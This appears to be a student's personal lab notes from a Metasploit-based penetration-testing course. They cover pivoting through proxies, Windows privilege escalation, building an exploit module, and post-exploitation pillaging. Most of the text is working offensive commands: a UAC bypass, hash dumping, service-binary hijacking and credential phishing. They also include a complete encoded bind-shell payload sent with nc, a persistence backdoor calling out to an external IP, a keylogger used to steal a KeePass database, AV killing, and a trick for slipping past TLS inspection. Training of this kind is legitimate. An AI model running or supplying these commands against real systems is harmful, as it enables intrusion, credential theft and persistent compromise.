26-Apr-2024 08:56 -- 

{{{ Lab 2.1 Routing, Forwarding, Proxies ================================================================



################################## LAB #################################

// portscan 
use auxiliary/scanner/portscan/tcp

\\ 2 options for forwarding thu privots  

// portfwd 
portfwd add -l 58021 -r 10.5.80.1 -p 80
connect -w 1 -z 127.0.0.1 58021


// route add 
route add 10.5.80.0/24 1

// expose metasploit routing! 
use auxiliary/server/socks_proxy
set VERSION 4a
run 

\\ curl through a proxy! -x 
curl -s --proxy socks4://127.0.0.1:1080 http://10.5.80.1 | head


// scan
wpscan --url 'http://localhost:58021/wordpress'




===================================================================}}}

{{{ 2.2 Privesc ================================================================

#################################### LAB

// after meterpreter session, winSxS UAC bypass 
msf6 > search bypassuac
use exploit/windows/local/bypassuac_injection_winsxs
getprivs \\ show privileges, if only the 5 = limited user. need all ~20
run post/windows/gather/smart_hashdump \\ works!

// PowerUp.ps1 and exploiting Misconf. services
- unpriv meterp
load powershell
powershell_import /home/sec580/labfiles/PowerUp.ps1
powershell_shell

\\ search for vulns
Invoke-AllChecks | Format-List *

\\ verify can control service bin 
PS > Install-ServiceBinary -ServiceName 'SEC580-example' -Command "cmd /c whoami > C:\test.txt"

// 3. Phishing for PT creds 
run post/windows/gather/phish_windows_credentials

\\ --- PHISH FOR CRED OF EXPLOITED PROCESS!!!



{{{ set up a vuln windows service for privesc ================================================================

mkdir C:\ProgramData\SEC580
copy /Y C:\Windows\system32\spoolsv.exe C:\ProgramData\SEC580\vulnerable-service.exe
sc create SEC580-example binpath= C:\ProgramData\SEC580\vulnerable-service.exe
cacls C:\ProgramData\SEC580\vulnerable-service.exe /E /G Users:C
sc sdset sec580-example D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RPWPDTLO;;;AU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)


===================================================================}}}


// ADDITIONAL SERVICE ABUSES
1. Use unicorn.py to create an AV-resistent command to directly instantiate a new meterpreter session 2. Reset the local Administrator password and connect via the exploit/windows/smb/psexec module
3. Use the exploit/multi/script/web_delivery module and let Metasploit create a PowerShell one-liner for us
4. Use msfvenom to create a Windows service executable with an embedded payload, replace the binary, then restart the service
5. Use shellter.exe to create AV-resistent executables with embedded payloads, replace the binary, then restart the service

===================================================================}}}

{{{ 2.3 Creating an exploit module ================================================================


// configure bind tcp exploit against EENS 
msfvenom -p windows/shell_bind_tcp LPORT=58023 -e x86/alpha_mixed BufferRegister=EAX 2>/dev/null ; echo

echo -n "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIlJHLBUPC0uPu0nim5EaYP1tNkBpVPNk2rtLnkaBdTlKBRdhVoX7PJEvfQ9oNL5lPaCLDB6L5pJajo6mWqjgjB8rBr1GnkrrfplKbjelNkPLFq3HHcW8VaJqBqLKF9upeQKcLKG9ghIsTzbilKTtLKc1HVuaioNLiQjoDMWqjgTxm0bUL6VccMJX5kSMtd2UItchNkaHTdWq9CqvnkVl2klKqH5L5QKcLKs4nk5QN0oyW47Ta4ckcksQSicjf1kOKPSoCorzlKWbHknmcmcXGCfRgpePE80wPsdrSoBtU8Rl3GgVGwKOjuOHlP6auPs0diyTPTPP2HdiMPbKeP9oXUqzDH1IBpKRYmg0bpQPv0bHHjTOYOKPyo8UOgcXGruPzBLgMYJF0j4Prv0W1xxByKFWawKOZuCgCX87iyfXioKOZu2wPhd4XlUkhaYohUPWj7583EbNrm51kOhUcX2CPm545POyiscgaGpWTqL6PjwbF9F6yrKM2FiWqTWTwLeQGqnmstGTVpO6Gp1TQD0PF6aFcf1Vf6PN1FsfCc0V58t9Jl7OOvYoHUk9ippN2vSvyoP0U8vhLGWmcPIoyEmk8px5I2QFcXNFNuOMMMKOIEulvfSLtJmPikYp2UeUoKg7DSQbPo2JgpV3kOn5AA" | base64 -w0; echo

// test it 

echo ';UFlJSUlJSUlJSUlJSUlJSUlJN1FaakFYUDBBMEFrQUFRMkFCMkJCMEJCQUJYUDhBQnVKSUlsSkhMQlVQQzB1UHUwbmltNUVhWVAxdE5rQnBWUE5rMnJ0TG5rYUJkVGxLQlJkaFZvWDdQSkV2ZlE5b05MNWxQYUNMREI2TDVwSmFqbzZtV3FqZ2pCOHJCcjFHbmtycmZwbEtiamVsTmtQTEZxM0hIY1c4VmFKcUJxTEtGOXVwZVFLY0xLRzlnaElzVHpiaWxLVHRMS2MxSFZ1YWlvTkxpUWpvRE1XcWpnVHhtMGJVTDZWY2NNSlg1a1NNdGQyVUl0Y2hOa2FIVGRXcTlDcXZua1ZsMmtsS3FINUw1UUtjTEtzNG5rNVFOMG95VzQ3VGE0Y2tja3NRU2ljamYxa09LUFNvQ29yemxLV2JIa25tY21jWEdDZlJncGVQRTgwd1BzZHJTb0J0VThSbDNHZ1ZHd0tPanVPSGxQNmF1UHMwZGl5VFBUUFAySGRpTVBiS2VQOW9YVXF6REgxSUJwS1JZbWcwYnBRUHYwYkhIalRPWU9LUHlvOFVPZ2NYR3J1UHpCTGdNWUpGMGo0UHJ2MFcxeHhCeUtGV2F3S09adUNnQ1g4N2l5Zlhpb0tPWnUyd1BoZDRYbFVraGFZb2hVUFdqNzU4M0ViTnJtNTFrT2hVY1gyQ1BtNTQ1UE95aXNjZ2FHcFdUcUw2UGp3YkY5RjZ5cktNMkZpV3FUV1R3TGVRR3FubXN0R1RWcE82R3AxVFFEMFBGNmFGY2YxVmY2UE4xRnNmQ2MwVjU4dDlKbDdPT3ZZb0hVazlpcHBOMnZTdnlvUDBVOHZoTEdXbWNQSW95RW1rOHB4NUkyUUZjWE5GTnVPTU1NS09JRXVsdmZTTHRKbVBpa1lwMlVlVW9LZzdEU1FiUG8ySmdwVjNrT241QUE=' | nc 10.10.10.20 9000 -v

nc -v 10.10.10.20 58023 // conn to bind 


\\ ############# CREATE THE MODULE

mkdir -p ~/.msf4/modules/exploits/windows/misc


===================================================================}}}

{{{ 2.4 Post-Exploit & Adv pillaging================================================================

// meterpreter scripts 
winenum.rb 
killav.rb
- killing AV doesn't prevent dll injected by AV (API hooking). uninstall -> reboot = best way...

sam.hive
system.hive = key to SAM
- can use reg.exe + rdp to grab

// meterp
run persistence -r 10.10.101.10 -A -X //

\\ LAB - KEYLOGGER
run post/windows/gather/enum_applications
        - keepass installed... we want passwords, so search for .kdbx
search -d 'C:\Users' -f *.kdbx
        C:\Users\student\Documents\Database.kdbx  2510          2019-07-08 07:52:24 +0000
download 'C:\Users\student\Documents\Database.kdbx' /home/sec580/Desktop/Database.kdbx
        -- it needs passwd... SETUP KEYLOGGER

info post/windows/capture/keylog_recorder
run post/windows/capture/keylog_recorder
ctrl+C

cat /root/.msf4/loot/*.key*.txt

\\ OTHER pillagine modules 
post/windows/gather/cachedump
post/multi/gather/env
post/windows/wlan/wlan_profile
post/windows/gather/credentials/rdc_manager_creds

\\ KeeThief = KeePass alt.

===================================================================}}}

{{{ 2.5 Persistencec & Analyzing Forensi Artifax ================================================================






===================================================================}}}

{{{ 2.6 (bonus) c2 via 3rd party infrax ================================================================

===================================================================}}}

{{{ MISC ================================================================
// rememba hosts file 
C:\Windows\system32\drivers\etc\hosts

// Invoke-Credential Phisher: ALL OUTLOOK 
https://github.com/fox-it/Invoke-CredentialPhisher


// how to subvert TLS interception w/domains? (e.g. root CAs pushed out like DoD)
use bank, healthcare, legal/laywer: domains = outbound HTTPS 



// set Proxy in metasploit 
ssh <pivot> -R 1080
vim /etc/proxychains.conf - config to use socks5 

proxychains XXXX  

// or in msf
setg Proxies socks5:127.0.0.1:1080
===================================================================}}}
